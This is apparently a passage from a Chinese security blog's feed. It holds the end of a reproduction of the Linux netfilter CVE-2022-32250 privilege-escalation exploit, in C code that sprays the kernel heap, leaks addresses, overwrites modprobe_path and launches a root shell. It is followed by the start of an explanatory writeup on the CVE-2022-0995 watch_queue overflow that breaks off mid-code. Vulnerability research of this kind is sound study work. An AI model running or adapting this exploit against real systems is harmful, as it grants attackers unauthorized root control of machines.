&#123;</span><br><span class="line">        close(fd_buffer[i].fd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(fd_buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">release_partial_uring</span><span class="params">(struct fd_uring *fd_buffer, <span class="keyword">uint32_t</span> buffer_idx)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    close(fd_buffer[buffer_idx].fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare_root_shell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    create_dummy_file();</span><br><span class="line">    create_priv_file();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create_dummy_file</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line">    fd = open(dummy_file, O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO);</span><br><span class="line">    write(fd, dummy_content, <span class="keyword">sizeof</span>(dummy_content));</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create_priv_file</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line">    fd = open(priv_file, O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO);</span><br><span class="line">    write(fd, priv_context, <span class="keyword">sizeof</span>(priv_context));</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;gcc -o /tmp/shell /tmp/shell.c -w&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_new_modprobe</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd, fd_modprobe;</span><br><span class="line">    <span class="keyword">char</span> modprobe_name[<span class="number">0x10</span>] = &#123;<span class="number">0</span>, &#125;;</span><br><span class="line"></span><br><span class="line">    fd_modprobe = open(<span class="string">&quot;/proc/sys/kernel/modprobe&quot;</span>, O_RDONLY);</span><br><span class="line">    read(fd_modprobe, modprobe_name, <span class="number">14</span>);</span><br><span class="line">    close(fd_modprobe);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] current modprobe name: %s\n&quot;</span>, modprobe_name);</span><br><span class="line">    fd = open(modprobe_name, O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">        do_error_exit(<span class="string">&quot;open&quot;</span>);</span><br><span class="line"></span><br><span class="line">    write(fd, new_modprobe_content, <span class="keyword">sizeof</span>(new_modprobe_content));</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup_modprobe_payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    write_new_modprobe();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">userland_T</span><span class="params">(<span class="keyword">int</span> *sema)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(*sema);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sema_up</span><span class="params">(<span class="keyword">int</span> *sema)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *sema = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sema_down</span><span class="params">(<span class="keyword">int</span> *sema)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *sema = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> ** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    <span class="keyword">char</span> writebuf[<span class="number">0x2000</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> mqname[MQUEUE_NUM][NAMELEN] = &#123;<span class="string">&quot;/qname1&quot;</span>, <span class="string">&quot;/qname2&quot;</span>, <span class="string">&quot;/qname3&quot;</span>, <span class="string">&quot;/qname4&quot;</span>, <span class="string">&quot;/qname5&quot;</span>&#125;;</span><br><span class="line">    <span class="keyword">mqd_t</span> mqid[MQUEUE_NUM];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mq_attr</span> <span class="title">attr</span>;</span></span><br><span class="line">attr.mq_flags   = <span class="number">0</span>;</span><br><span class="line">attr.mq_maxmsg  = <span class="number">10</span>;</span><br><span class="line">attr.mq_msgsize = BUFFER;</span><br><span class="line">attr.mq_curmsgs = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> uaf_id = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> *sema = mmap(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> *sema2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    prepare_root_shell();</span><br><span class="line">    sema_up(sema);</span><br><span class="line">    <span class="keyword">if</span>(fork())</span><br><span class="line">    &#123;</span><br><span class="line">        set_cpu_affinity(<span class="number">1</span>, getpid());</span><br><span class="line">        userland_T(sema);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n\n[------------------------- stage 4: Execute Malicious File -------------------------------]\n&quot;</span>);</span><br><span class="line">        setup_modprobe_payload();</span><br><span class="line">        execve(<span class="string">&quot;/tmp/dummy&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">        execve(<span class="string">&quot;/tmp/shell&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    unshare_setup(getuid(), getgid());</span><br><span class="line"></span><br><span class="line">    set_cpu_affinity(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fd_uring</span> *<span class="title">fd_buffer</span> =</span> <span class="built_in">calloc</span>(SPRAY_SIZE, <span class="keyword">sizeof</span>(struct fd_uring));</span><br><span class="line">    <span class="keyword">if</span> (!fd_buffer)</span><br><span class="line">        do_error_exit(<span class="string">&quot;calloc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)</span><br><span class="line">        <span class="keyword">if</span>((mqid[i] = mq_open(mqname[i], O_CREAT | O_RDWR, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH, &amp;attr)) &lt; <span class="number">0</span>)</span><br><span class="line">            bye(<span class="string">&quot;MQUEUE&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mnl_socket</span>* <span class="title">nl</span> =</span> mnl_socket_open(NETLINK_NETFILTER);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\n[------------------------- stage 0: Allocate stable table and set ------------------------]\n&quot;</span>);</span><br><span class="line">    set_stable_table_and_set(nl, <span class="string">&quot;table1&quot;</span>);</span><br><span class="line">    set_stable_table_and_set(nl, <span class="string">&quot;table2&quot;</span>);</span><br><span class="line">    set_stable_table_and_set(nl, <span class="string">&quot;table3&quot;</span>);</span><br><span class="line">    set_stable_table_and_set(nl, <span class="string">&quot;table4&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\n[------------------------- stage 1: Leak heap address ------------------------------------]\n&quot;</span>);</span><br><span class="line">    set_trigger_set_and_overwrite(nl, <span class="string">&quot;table1&quot;</span>, <span class="string">&quot;set_trigger0&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">key_serial_t</span> *id_buffer = spray_keyring(<span class="number">0</span>, SPRAY_KEY_SIZE);</span><br><span class="line"></span><br><span class="line">    set_trigger_set_and_overwrite(nl, <span class="string">&quot;table1&quot;</span>, <span class="string">&quot;set_trigger1&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>((uaf_id = get_keyring_leak(id_buffer, SPRAY_KEY_SIZE)) == SPRAY_KEY_SIZE)</span><br><span class="line">        bye(<span class="string">&quot;[-] leak failed...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\n[------------------------- stage 2: Leak KASLR address -----------------------------------]\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    spray_uring(SPRAY_SIZE, fd_buffer);</span><br><span class="line"></span><br><span class="line">    set_trigger_set_and_overwrite(nl, <span class="string">&quot;table2&quot;</span>, <span class="string">&quot;set_trigger2&quot;</span>);</span><br><span class="line">    spray_mqueue(mqid[<span class="number">0</span>], <span class="string">&quot;TESTMSGTESTMSGTESTMSGTESTMSGTESTMSG&quot;</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    release_partial_uring(fd_buffer, SPRAY_SIZE<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>; i &gt; <span class="number">113</span>; i++)</span><br><span class="line">        release_partial_uring(fd_buffer, SPRAY_SIZE-i);</span><br><span class="line">    release_partial_uring(fd_buffer, SPRAY_SIZE<span class="number">-2</span>);</span><br><span class="line">    set_trigger_set_and_overwrite(nl, <span class="string">&quot;table2&quot;</span>, <span class="string">&quot;set_trigger3&quot;</span>);</span><br><span class="line">    <span class="keyword">key_serial_t</span> *id_buffer3 = spray_keyring_list_del_purpose(SPRAY_KEY_SIZE*<span class="number">2</span>, heap_base, heap_base, <span class="number">0x28</span>);<span class="comment">// keyring &lt;-&gt; msg_msg overlap</span></span><br><span class="line">    gather_mqueue(mqid[<span class="number">0</span>], <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\n[------------------------- stage 3: Overwrite modprobe_path ------------------------------]\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    set_trigger_set_and_overwrite(nl, <span class="string">&quot;table3&quot;</span>, <span class="string">&quot;set_trigger4&quot;</span>);</span><br><span class="line">    spray_mqueue(mqid[<span class="number">1</span>], <span class="string">&quot;TESTMSGTESTMSGTESTMSGTESTMSGTESTMSG&quot;</span>, <span class="number">4</span>);</span><br><span class="line">    set_trigger_set_and_overwrite(nl, <span class="string">&quot;table3&quot;</span>, <span class="string">&quot;set_trigger5&quot;</span>);</span><br><span class="line">    id_buffer = spray_keyring_list_del_purpose(<span class="number">1</span>, modprobe_addr<span class="number">-0x8</span>+<span class="number">0x1</span>, (heap_base&amp;<span class="number">0xffffffff00000000</span>)+<span class="number">0x2f706d74</span>, <span class="number">0x10</span>);</span><br><span class="line">    sema_down(sema);</span><br><span class="line">    gather_mqueue_nosave(mqid[<span class="number">1</span>], <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=SPRAY_SIZE/<span class="number">2</span>+<span class="number">12</span>; i&lt;SPRAY_SIZE; i++)</span><br><span class="line">        release_partial_uring(fd_buffer, i);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里也用了<code>io_uring</code>，不过我看其申请的参数其实是<code>GFP_KERNEL_ACCOUNT</code>，不明白为什么这里又可以进行占位了( 有种自相矛盾的感觉 )。</p><hr><p>参考链接:</p><p>​    <a class="link"   href="https://blog.theori.io/linux-kernel-exploit-cve-2022-32250-with-mqueue-a8468f32aab5" >https://blog.theori.io/linux-kernel-exploit-cve-2022-32250-with-mqueue-a8468f32aab5<i class="fas fa-external-link-alt"></i></a></p><p>​    <a class="link"   href="https://github.com/theori-io/CVE-2022-32250-exploit" >https://github.com/theori-io/CVE-2022-32250-exploit<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;因为工作目前面对着一个不怎么熟悉的&lt;code&gt;netfilter&lt;/code&gt;这一模块，所以直接复现一个以往的CVE来认识认识这个模块。&lt;/</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    <category term="CVE" scheme="https://cv196082.gitee.io/categories/kernel-pwn/CVE/"/>
    
    
    <category term="netfilter" scheme="https://cv196082.gitee.io/tags/netfilter/"/>
    
    <category term="io_uring" scheme="https://cv196082.gitee.io/tags/io-uring/"/>
    
    <category term="user_key_payload" scheme="https://cv196082.gitee.io/tags/user-key-payload/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2022-0995</title>
    <link href="https://cv196082.gitee.io/2023/08/21/CVE-2022-0995/"/>
    <id>https://cv196082.gitee.io/2023/08/21/CVE-2022-0995/</id>
    <published>2023-08-21T06:27:52.000Z</published>
    <updated>2023-08-21T06:27:10.888Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>其实前两天复现了一个2023的CVE，本来打算写那一个的，但是对于那个CVE更多的是做工作上的适配，在一些小细节上的原理并没有掌握得特别透彻，并且因为是刚刚公开的一个CVE也导致没有更多的文章进行参考，等后面进一步分析一下源码再写。</p><p>此次的CVE是存在于观察队列事件通知子系统 (watch_queue event notification subsystem) 中的一个堆溢出漏洞，该漏洞从内核版本5.8伴随着 watch queue subsystem 引入，在 5.17-rc4 得到修复。</p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>通用通知机制是建立在标准管道驱动之上的，其可以有效地将来自内核的通知消息拼接到用户打开的管道中，我们可以通过 <code>CONFIG_WATCH_QUEUE</code> 编译选项启用（默认开启）</p><p>该机制通过一个以特殊模式打开的管道实现，内核生成的消息被保存到管道内部的循环环形缓冲区中（<code>pipe_buffer</code> 队列），通过 <code>read()</code> 进行读取，由于在某些情况下我们可能想要将添加的内容还原到环上，因此在此类管道上禁用了 splice 以及类似功能（因为这可能导致其与通知消息交织在一起）</p><p>管道的所有者应当告诉内核哪些资源其想要通过该管道进行观察，只有连接到该管道上的资源才会往里边插入消息，需要注意的是一个资源可能会与多个管道绑定并同时将消息插入所有管道</p><p>若环中没有可用的插槽或可用的预分配的 message buffer（一个管道默认只有 16 个 <code>pipe_buffer</code> ——对应 16 张内存页），则消息将会被丢弃，在这两种情况下，<code>read()</code> 将在读取当前缓冲区的最后一条消息后将 <code>WATCH_META_LOSS_NOTIFICATION</code> 插入输出缓冲区。</p><h3 id="Watch-Queue-API"><a href="#Watch-Queue-API" class="headerlink" title="Watch Queue API"></a>Watch Queue API</h3><p>一个观测队列（watch queue）是由一个应用分配的用以记录通知的缓冲区，其工作原理完全隐藏在管道设备驱动中，但有必要获得一个对其的引用以设置一个观测，可以通过以下 API 进行管理：</p><ul><li><p><code>struct watch_queue *get_watch_queue(int fd);</code></p><p>  由于观测队列在内核中通过实现缓冲区的管道的文件描述符表示，用户空间必须通过系统调用传递该文件描述符，这可以用于从系统调用中查找指向观测队列的不透明指针</p></li><li><p><code>void put_watch_queue(struct watch_queue *wqueue);</code></p><p>  该函数用以丢弃从 <code>get_watch_queue()</code> 获得的引用</p></li></ul><h3 id="Event-Filter"><a href="#Event-Filter" class="headerlink" title="Event Filter"></a>Event Filter</h3><p>当一个观测队列被创建后，我们可以使用过滤器限制接收的事件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_filter</span> &#123;</span></span><br><span class="line">__u32nr_filters;<span class="comment">/* Number of filters */</span></span><br><span class="line">__u32__reserved;<span class="comment">/* Must be 0 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_type_filter</span> <span class="title">filters</span>[];</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_filter</span> <span class="title">filter</span> =</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">&#125;;</span><br><span class="line">ioctl(fd, IOC_WATCH_QUEUE_SET_FILTER, &amp;filter)</span><br></pre></td></tr></table></figure><p>这里主要解释一下结构体中的成员的含义，<code>nr_filters</code>成员表示的是<code>filters[]</code>数组中过滤器的数量，而可以看出来<code>__reserved</code>是必须置0的。需要注意的是其中<code>filters[]</code>数组的类型为<code>watch_notification_type_filter</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_type_filter</span> &#123;</span></span><br><span class="line">__u32type;<span class="comment">/* Type to apply filter to */</span></span><br><span class="line">__u32info_filter;<span class="comment">/* Filter on watch_notification::info */</span></span><br><span class="line">__u32info_mask;<span class="comment">/* Mask of relevant bits in info_filter */</span></span><br><span class="line">__u32subtype_filter[<span class="number">8</span>];<span class="comment">/* Bitmask of subtypes to filter on */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里也是简单介绍一下其中的结构体的含义，首先是<code>type</code>代表的是需要过滤事件的类型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">watch_notification_type</span> &#123;</span></span><br><span class="line">WATCH_TYPE_META= <span class="number">0</span>,<span class="comment">/* Special record */</span></span><br><span class="line">WATCH_TYPE_KEY_NOTIFY= <span class="number">1</span>,<span class="comment">/* Key change event notification */</span></span><br><span class="line">WATCH_TYPE__NR= <span class="number">2</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>info_filter</code>成员与<code>info_mask</code>成员充当的是通知记录的信息字段的过滤器，仅当如下情况才会将通知写入缓冲区：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(watch.info &amp; info_mask) == info_filter</span><br></pre></td></tr></table></figure><p><code>subtype_filter</code>成员则是指示我们感兴趣的字类型的<code>bitmask</code>，<code>subtype_filter[0]</code>的0位对应子类型0，1位对应子类型1…</p><p>若是上面使用<code>ioctl(fd, IOC_WATCH_QUEUE_SET_FILTER, NULL)</code>则为移出过滤器，此时接受所有来自观测的信息。</p><h3 id="watch-queue-subsystem-中-Event-Filter-实现"><a href="#watch-queue-subsystem-中-Event-Filter-实现" class="headerlink" title="watch queue subsystem 中 Event Filter 实现"></a>watch queue subsystem 中 Event Filter 实现</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(ioctl, <span class="keyword">unsigned</span> <span class="keyword">int</span>, fd, <span class="keyword">unsigned</span> <span class="keyword">int</span>, cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span> =</span> fdget(fd);</span><br><span class="line"><span class="keyword">int</span> error;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!f.file)</span><br><span class="line"><span class="keyword">return</span> -EBADF;</span><br><span class="line"></span><br><span class="line">error = security_file_ioctl(f.file, cmd, arg);</span><br><span class="line"><span class="keyword">if</span> (error)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">error = do_vfs_ioctl(f.file, fd, cmd, arg);</span><br><span class="line"><span class="keyword">if</span> (error == -ENOIOCTLCMD)</span><br><span class="line">error = vfs_ioctl(f.file, cmd, arg);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">fdput(f);</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先则是我们调用<code>ioctl</code>是会进入如上函数，并且通过验证之后最终会调用到<code>do_vfs_ioctl</code>函数，而这个函数内部就是一个硕大<code>switch</code>语句根据cmd进行处理，但是<code>IOC_WATCH_QUEUE_SET_FILTER</code>并不在其中，所以最终会调用到<code>vfs_ioctl</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">vfs_ioctl</span><span class="params">(struct file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> error = -ENOTTY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!filp-&gt;f_op-&gt;unlocked_ioctl)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">error = filp-&gt;f_op-&gt;unlocked_ioctl(filp, cmd, arg);</span><br><span class="line"><span class="keyword">if</span> (error == -ENOIOCTLCMD)</span><br><span class="line">error = -ENOTTY;</span><br><span class="line"> out:</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(vfs_ioctl);</span><br></pre></td></tr></table></figure><p>可以注意到的事这里其实调用的是<code>filp-&gt;f_op-&gt;unlocked_ioctl</code>函数，所以首要就是要搞明白这是个什么函数。</p><p>前文提到，通知机制是建立在管道上面的，所以这里文件描述符其实也就是管道的，那么我们当前则需要更多的将目光放在管道的创建上面，而管道的创建存在以下调用关系：<code>do_pipe2() =&gt; __do_pipe_flags() =&gt; create_pipe_files() =&gt; alloc_file_pseudo() =&gt; alloc_file()</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct file *<span class="title">alloc_file</span><span class="params">(<span class="keyword">const</span> struct path *path, <span class="keyword">int</span> flags,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">const</span> struct file_operations *fop)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line"></span><br><span class="line">file = alloc_empty_file(flags, current_cred());</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(file))</span><br><span class="line"><span class="keyword">return</span> file;</span><br><span class="line"></span><br><span class="line">file-&gt;f_path = *path;</span><br><span class="line">file-&gt;f_inode = path-&gt;dentry-&gt;d_inode;</span><br><span class="line">file-&gt;f_mapping = path-&gt;dentry-&gt;d_inode-&gt;i_mapping;</span><br><span class="line">file-&gt;f_wb_err = filemap_sample_wb_err(file-&gt;f_mapping);</span><br><span class="line">file-&gt;f_sb_err = file_sample_sb_err(file);</span><br><span class="line"><span class="keyword">if</span> ((file-&gt;f_mode &amp; FMODE_READ) &amp;&amp;</span><br><span class="line">     likely(fop-&gt;read || fop-&gt;read_iter))</span><br><span class="line">file-&gt;f_mode |= FMODE_CAN_READ;</span><br><span class="line"><span class="keyword">if</span> ((file-&gt;f_mode &amp; FMODE_WRITE) &amp;&amp;</span><br><span class="line">     likely(fop-&gt;write || fop-&gt;write_iter))</span><br><span class="line">file-&gt;f_mode |= FMODE_CAN_WRITE;</span><br><span class="line">file-&gt;f_mode |= FMODE_OPENED;</span><br><span class="line">file-&gt;f_op = fop;</span><br><span class="line"><span class="keyword">if</span> ((file-&gt;f_mode &amp; (FMODE_READ | FMODE_WRITE)) == FMODE_READ)</span><br><span class="line">i_readcount_inc(path-&gt;dentry-&gt;d_inode);</span><br><span class="line"><span class="keyword">return</span> file;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到的是这里对于ops的赋值是发生在这个位置的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create_pipe_files</span><span class="params">(struct file **res, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> get_pipe_inode();</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">f</span>;</span></span><br><span class="line"><span class="keyword">int</span> error;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!inode)</span><br><span class="line"><span class="keyword">return</span> -ENFILE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (flags &amp; O_NOTIFICATION_PIPE) &#123;</span><br><span class="line">error = watch_queue_init(inode-&gt;i_pipe);</span><br><span class="line"><span class="keyword">if</span> (error) &#123;</span><br><span class="line">free_pipe_info(inode-&gt;i_pipe);</span><br><span class="line">iput(inode);</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f = alloc_file_pseudo(inode, pipe_mnt, <span class="string">&quot;&quot;</span>,</span><br><span class="line">O_WRONLY | (flags &amp; (O_NONBLOCK | O_DIRECT)),</span><br><span class="line">&amp;pipefifo_fops);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(f)) &#123;</span><br><span class="line">free_pipe_info(inode-&gt;i_pipe);</span><br><span class="line">iput(inode);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(f);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f-&gt;private_data = inode-&gt;i_pipe;</span><br><span class="line"></span><br><span class="line">res[<span class="number">0</span>] = alloc_file_clone(f, O_RDONLY | (flags &amp; 